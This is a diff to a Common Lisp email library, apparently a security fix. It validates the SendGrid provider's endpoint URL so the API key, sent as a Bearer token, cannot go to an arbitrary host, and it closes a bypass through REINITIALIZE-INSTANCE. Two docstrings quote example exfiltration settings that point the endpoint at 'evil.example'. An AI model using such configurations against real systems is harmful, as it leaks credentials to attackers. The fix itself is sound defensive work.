@@ -7,12 +7,21 @@
 
 (cl:in-package #:hermes)
 
+(defparameter +sendgrid-endpoint-default+ "https://api.sendgrid.com/v3/mail/send"
+  "Where SendGrid's mail/send API lives. THE ONLY PLACE THIS URL IS WRITTEN in the tree, and not
+only for tidiness: upstream.sexp tracks the SendGrid API version by reading what follows the API
+host in this file, up to the NEXT SLASH (upstream.sexp:254), and every occurrence must agree.
+Twilio's entry ends at the closing quote instead, because its version ends the string; this one
+does not, and an earlier version of this docstring claimed it did. The same pin broke
+twice for Twilio in #1077 -- once because a refusal message quoted the URL as an example, and
+once because the docstring explaining that quoted the marker it was describing (#1092).")
+
 (defclass sendgrid (email-provider)
   ((api-key :initarg :api-key
             :initform (uiop:getenv "SENDGRID_API_KEY")
             :reader sendgrid-api-key)
    (endpoint :initarg :endpoint
-             :initform "https://api.sendgrid.com/v3/mail/send"
+             :initform +sendgrid-endpoint-default+
              :reader sendgrid-endpoint)
    (connect-timeout :initarg :connect-timeout
                     :initform *send-connect-timeout*
@@ -26,9 +35,47 @@ $SENDGRID_API_KEY. CONNECT-TIMEOUT and READ-TIMEOUT are seconds and default from
 AION/HTTP-CLIENT passes a timeout to dexador only when one is set, so NIL leaves dexador's own
 default of ten seconds in force. There is no way from here to ask for an unlimited wait."))
 
+(defmethod shared-initialize :after ((p sendgrid) slot-names &rest initargs &key &allow-other-keys)
+  "Check the configured URL on EVERY initialization, not only the first.
+
+SHARED-INITIALIZE AND NOT INITIALIZE-INSTANCE. The check used to hang off
+INITIALIZE-INSTANCE :AFTER, which REINITIALIZE-INSTANCE does not call, so
+
+  (reinitialize-instance (make-instance 'hermes::sendgrid ...) :endpoint \"http://evil.example/x\")
+
+was accepted and the next send carried the credential there in plaintext. SHARED-INITIALIZE runs
+for both, so there is no second door (the review of #1104)."
+  (declare (ignore slot-names initargs))
+  (%check-endpoint (sendgrid-endpoint p)))
+
+(defun %check-endpoint (endpoint)
+  "Signal CONFIGURATION-ERROR unless ENDPOINT is a URL a SendGrid request may carry the API key
+to (#1092).
+
+Every request carries the key as a Bearer credential in an Authorization header, so where the
+request goes is where the key goes. Until #1092 this was not checked at all, so
+(MAKE-SENDGRID :ENDPOINT \"http://evil.example/v3/mail/send\") sent the key in plaintext to
+whatever host was named.
+
+THE REFUSALS ARE %CHECK-CREDENTIAL-URL's, shared with Twilio rather than written again here. That
+is the whole point of the issue: the locality half of this rule existed twice, in hermes core and
+hermes/blob, and the two copies acquired three different holes between them. A third hand-written
+copy would have been the same bet.
+
+APPENDS-PATH IS NIL, because DELIVER sends this value as the request URL exactly as it stands --
+unlike Twilio's API base, which has a path appended to it. So a query or a fragment is harmless
+here and is not refused, and there is no second string to compare the approved host against."
+  (%check-credential-url endpoint
+                         :setting "SendGrid ENDPOINT"
+                         :example +sendgrid-endpoint-default+
+                         :credential "the API key"
+                         :appends-path nil))
+
 (defun make-sendgrid (&rest initargs &key api-key endpoint connect-timeout read-timeout)
-  "A SendGrid provider. API-KEY/ENDPOINT default from the environment, and the two timeouts from
-*SEND-CONNECT-TIMEOUT* and *SEND-READ-TIMEOUT* (#1077)."
+  "A SendGrid provider. API-KEY defaults from $SENDGRID_API_KEY, and the two timeouts from
+*SEND-CONNECT-TIMEOUT* and *SEND-READ-TIMEOUT* (#1077). ENDPOINT HAS NO ENVIRONMENT DEFAULT: it
+is +SENDGRID-ENDPOINT-DEFAULT+ unless passed in code, which an earlier version of this docstring
+got wrong. It is checked whenever it is set (#1092)."
   (declare (ignore api-key endpoint connect-timeout read-timeout))
   (apply #'make-instance 'sendgrid initargs))
 
